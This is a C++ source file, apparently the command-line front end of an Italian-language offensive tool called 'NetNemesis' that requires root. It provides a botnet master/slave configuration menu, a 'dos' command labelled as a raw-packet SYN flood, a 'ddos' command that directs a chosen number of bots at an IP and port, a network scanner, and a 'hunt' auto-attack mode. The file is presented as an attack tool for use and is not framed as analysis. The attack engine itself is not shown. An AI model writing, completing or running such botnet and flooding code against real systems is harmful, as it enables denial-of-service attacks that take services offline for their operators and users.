#include "netnemesis.h"
#include <sstream>

std::atomic<bool> g_running(true);
std::atomic<bool> g_is_master(false);
std::atomic<bool> g_is_slave(false);
std::atomic<bool> g_auto_hunt(false);
std::mutex g_print_mutex;

bool checkRoot() {
    if (getuid() != 0) {
        std::cerr << "\033[31m[ERRORE] NetNemesis richiede privilegi root!\033[0m" << std::endl;
        std::cerr << "Esegui con: sudo ./netnemesis" << std::endl;
        return false;
    }
    return true;
}

NetNemesisCLI::NetNemesisCLI() : attack_engine(&botnet) {}

void NetNemesisCLI::showBanner() {
    const char* banners[] = {
        R"(
    _   __      __   _  __                __
   / | / /___  / /__| |/ /___  __  ______/ /
  /  |/ / __ \/ / _ \   / __ \/ / / / __  / 
 / /|  / /_/ / /  __/   / /_/ / /_/ / /_/ /  
/_/ |_/\____/_/\___/_/|_\____/\__,_/\__,_/   
    [ Packet Crafting Edition - Linux Only ]
)",
        R"(
    ███╗   ██╗███████╗████████╗███╗   ██╗███████╗███╗   ███╗███████╗███████╗██╗███████╗
    ████╗  ██║██╔════╝╚══██╔══╝████╗  ██║██╔════╝████╗ ████║██╔════╝██╔════╝██║██╔════╝
    ██╔██╗ ██║█████╗     ██║   ██╔██╗ ██║█████╗  ██╔████╔██║█████╗  ███████╗██║███████╗
    ██║╚██╗██║██╔══╝     ██║   ██║╚██╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  ╚════██║██║╚════██║
    ██║ ╚████║███████╗   ██║   ██║ ╚████║███████╗██║ ╚═╝ ██║███████╗███████║██║███████║
    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝╚══════╝
                                    [ ROOT REQUIRED ]
)",
    };
    srand(time(NULL));
    std::cout << "\033[35m" << banners[rand() % 2] << "\033[0m" << std::endl;
    std::cout << "\033[33m    Versione 3.0 - Type 'help' for commands\033[0m\n" << std::endl;
}

void NetNemesisCLI::botnetInteractiveMenu() {
    std::cout << "\n\033[36m╔════════════════════════════════╗\n";
    std::cout << "║     BOTNET CONFIGURATION       ║\n";
    std::cout << "╠════════════════════════════════╣\n";
    std::cout << "║  1. MASTER - Diventa master    ║\n";
    std::cout << "║  2. SLAVE  - Connettiti a master║\n";
    std::cout << "║  3. BACK   - Torna al menu     ║\n";
    std::cout << "╚════════════════════════════════╝\033[0m\n";
    std::cout << "Scelta: ";
    
    int scelta;
    std::cin >> scelta;
    std::cin.ignore();
    
    if (scelta == 1) {
        std::cout << "Inserisci porta per il MASTER [default: 6666]: ";
        std::string port_str;
        std::getline(std::cin, port_str);
        int port = port_str.empty() ? DEFAULT_BOTNET_PORT : std::stoi(port_str);
        botnet.startMaster(port);
    } else if (scelta == 2) {
        std::cout << "Inserisci IP del MASTER: ";
        std::string ip;
        std::getline(std::cin, ip);
        std::cout << "Inserisci porta del MASTER [default: 6666]: ";
        std::string port_str;
        std::getline(std::cin, port_str);
        int port = port_str.empty() ? DEFAULT_BOTNET_PORT : std::stoi(port_str);
        botnet.startSlave(ip, port);
    }
}

void NetNemesisCLI::run() {
    Utils::clearScreen();
    showBanner();
    
    std::string input;
    while (g_running) {
        std::cout << "\033[32mroot@NetNemesis\033[0m";
        if (g_is_master) std::cout << "\033[31m[MASTER]\033[0m";
        if (g_is_slave) std::cout << "\033[33m[SLAVE]\033[0m";
        if (g_auto_hunt) std::cout << "\033[35m[HUNT]\033[0m";
        std::cout << ":# ";
        
        std::getline(std::cin, input);
        if (input.empty()) continue;
        
        auto args = Utils::split(input, ' ');
        std::string cmd = args[0];
        
        if (cmd == "clear") {
            Utils::clearScreen();
            showBanner();
        }
        else if (cmd == "botnet") {
            botnetInteractiveMenu();
        }
        else if (cmd == "dos" && args.size() >= 3) {
            attack_engine.executeDOS(args[1], std::stoi(args[2]), true);
        }
        else if (cmd == "ddos" && args.size() >= 3) {
            int bots = (args.size() > 3) ? std::stoi(args[3]) : 10;
            attack_engine.executeDDOS(args[1], std::stoi(args[2]), bots);
        }
        else if (cmd == "scan") {
            scanner.start();
        }
        else if (cmd == "scan_stop") {
            scanner.stop();
            Utils::logInfo("Scanner fermato - Ritorno al menu principale");
        }
        else if (cmd == "hunt") {
            g_auto_hunt = !g_auto_hunt;
            Utils::logWarning(g_auto_hunt ? "HUNT MODE: ON" : "HUNT MODE: OFF");
            if (g_auto_hunt) scanner.start();
        }
        else if (cmd == "servers") {
            auto servers = scanner.getServers();
            Utils::logInfo("Server trovati: " + std::to_string(servers.size()));
            for (const auto &s : servers) {
                std::cout << "  - " << s.first << ":" << s.second << std::endl;
            }
        }
        else if (cmd == "exit" || cmd == "quit") {
            g_running = false;
            botnet.stop();
            scanner.stop();
            Utils::logInfo("Arrivederci!");
        }
        else if (cmd == "help") {
            std::cout << "\033[36m╔══════════════════════════════════════════════════════════════╗\n"
                         "║                    COMANDI DISPONIBILI                       ║\n"
                         "╠══════════════════════════════════════════════════════════════╣\n"
                         "║  \033[33mbotnet\033[36m                - Menu configurazione botnet          ║\n"
                         "║  \033[33mdos <ip> <port>\033[36m       - SYN Flood attack (raw packets)       ║\n"
                         "║  \033[33mddos <ip> <port> [n]\033[36m  - Distributed attack con n bot        ║\n"
                         "║  \033[33mscan\033[36m                  - Avvia scanner passivo              ║\n"
                         "║  \033[33mscan_stop\033[36m             - Ferma scanner (ritorna al menu)    ║\n"
                         "║  \033[33mhunt\033[36m                  - Toggle auto-attack mode            ║\n"
                         "║  \033[33mservers\033[36m               - Lista server trovati             ║\n"
                         "║  \033[33mclear\033[36m                 - Pulisci schermo                    ║\n"
                         "║  \033[33mexit\033[36m                  - Esci dal tool                      ║\n"
                         "╚══════════════════════════════════════════════════════════════╝\033[0m" << std::endl;
        }
        else {
            Utils::logError("Comando sconosciuto: " + cmd);
        }
    }
}

int main() {
    if (!checkRoot()) {
        return 1;
    }
    
    NetNemesisCLI cli;
    cli.run();
    
    return 0;
}